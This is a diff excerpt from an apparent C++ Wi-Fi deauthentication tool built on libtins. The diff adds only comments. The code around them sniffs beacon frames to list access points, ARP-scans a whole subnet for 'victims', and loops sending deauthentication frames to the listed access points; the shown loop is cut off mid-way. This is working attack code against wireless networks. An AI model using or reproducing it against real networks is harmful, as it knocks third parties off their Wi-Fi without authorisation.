@@ -27,6 +27,8 @@ WifiDeauth::WifiDeauth(std::string _ifaceTrigger, std::string _ifaceScanner, uin
     : ifaceTrigger(_ifaceTrigger), ifaceScanner(_ifaceScanner), rangeNet(Tins::IPv4Range::from_mask(ipNet, infoScanner.netmask)),
       strSniffer(_ifaceTrigger), channel(_channel){}
 
+
+//Sniffer callback function for 'listingAP()'
 bool WifiDeauth::callbackSniff(Tins::PDU &pdu) {
     const Tins::Dot11Beacon &beacon = pdu.rfind_pdu<Tins::Dot11Beacon>();
     if (!beacon.from_ds() && !beacon.to_ds()) {
@@ -39,6 +41,7 @@ bool WifiDeauth::callbackSniff(Tins::PDU &pdu) {
     return true;
 }
 
+//This method finds 802.11 Beacon(AP) PDU captured from a monitor interface.
 void WifiDeauth::listingAP(){
     Tins::SnifferConfiguration confSniff;
     confSniff.set_promisc_mode(true);
@@ -55,6 +58,7 @@ void WifiDeauth::scanVictims(){
             std::cout << std::endl << "[!] ARP Scanning Start... [ Estimate Time : " <<
                          (std::distance(rangeNet.begin(), rangeNet.end()) * 2) << "sec ]" << std::endl;
 
+    //Do ARP Scanning to all IP range addresses.
     for(const auto &target : rangeNet) {
         Tins::EthernetII scan = Tins::ARP::make_arp_request(target, infoScanner.ip_addr, infoScanner.hw_addr);
         std::unique_ptr<Tins::PDU> reply(sender.send_recv(scan, ifaceScanner));
@@ -68,7 +72,7 @@ void WifiDeauth::scanVictims(){
 
 void WifiDeauth::deauthVictims(){
     std::cout << std::endl << "[!] Deauthentication Start... [ Press Ctrl+C to Exit ]" << std::endl;
-    radio.channel(Tins::Utils::channel_to_mhz(channel), 0x00a0);
+    radio.channel(Tins::Utils::channel_to_mhz(channel), 0x00a0); //2407 + channel * 5, 0x00a0(802.11b)
     while(1){
         for(const auto &apTarget : vecFinalAP){
             deauth.addr1(apTarget);
